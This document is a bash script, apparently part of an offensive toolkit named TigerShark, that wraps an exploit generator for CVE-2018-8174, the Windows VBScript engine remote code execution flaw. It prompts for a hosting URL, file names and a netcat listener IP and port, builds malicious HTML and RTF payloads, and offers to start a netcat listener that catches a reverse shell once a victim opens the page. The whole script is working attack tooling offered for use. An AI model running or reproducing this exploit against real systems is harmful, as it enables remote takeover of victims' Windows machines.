#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
RED='\033[0;31m'
LBBLUE='\e[104m'

if [[ -d '/opt/TigerShark/Payloads/CVE-2018-8174' ]]; then
    sleep 1
else
    mkdir /opt/TigerShark/Payloads/CVE-2018-8174
fi
cd tools/CVE-2018-8174_EXP
echo -e "${ORNG}"
figlet -f mini "RCE_VBS Vuln Generator"
echo -e "${RED}CVE-2018-8174${NC}"
echo -e "${YLW}A remote code execution vulnerability exists in the way that the VBScript engine handles objects in memory,"
echo -e "aka Windows VBScript Engine Remote Code Execution Vulnerability. This affects Windows 7, Windows Server 2012 R2,"
echo -e "Windows RT 8.1, Windows Server 2008, Windows Server 2012, Windows 8.1, Windows Server 2016, Windows Server 2008 R2,"
echo -e "Windows 10, Windows 10 Servers.${NC}"
echo -e "${ORNG}This exploit is hosted on a server while the attacker listens with netcat, once the victim opens the webpage, a shell is opened in netcat"
echo -e "${W}Please enter the server URL this exploit will be hosted on"
echo -e "${ORNG}eg. https://yoursite.com${NC}"
read URL
echo -e "${W}Please enter the name of the .html (this will be seen in url bar)${W}"
echo -e "${ORNG}eg. blog.html(please add .html extention)${NC}"
read EXT
echo -e "${W}Please enter the name of .rtf output file(please add .rtf extention)${NC}"
read OUTPUT
echo -e "${W}Please enter the IP of netcat listener${NC}"
read IP
echo -e "${W}Please enter the Port of netcat listener${NC}"
read PORT
python CVE-2018-8174.py -u ${URL}/${EXT} -o ${OUTPUT}.rtf -i ${IP} -p ${PORT}
sudo mv ${EXT} ${OUTPUT} -t /opt/TigerShark/Payloads/CVE-2018-8174
echo -e "${YLW}Exploit saved to /opt/TigerShark/Payloads/CVE-2018-8174 folder${NC}"
echo -e "${W}Would you like to start a netcat listner now?(y/n)${NC}"
read LISTEN
if [[ ${LISTEN} == 'y' ]]; then
    echo -e "${W}Starting listener in xterm, please dont close the window until you are done, else start another netcat listener manually${NC}"
    xterm netcat -l ${PORT}
else
    echo -e "${W}Not starting listener, this can be done manually using the command 'netcat -l <your port>'${NC}"
fi
cd /opt/TigerShark
./tigershark
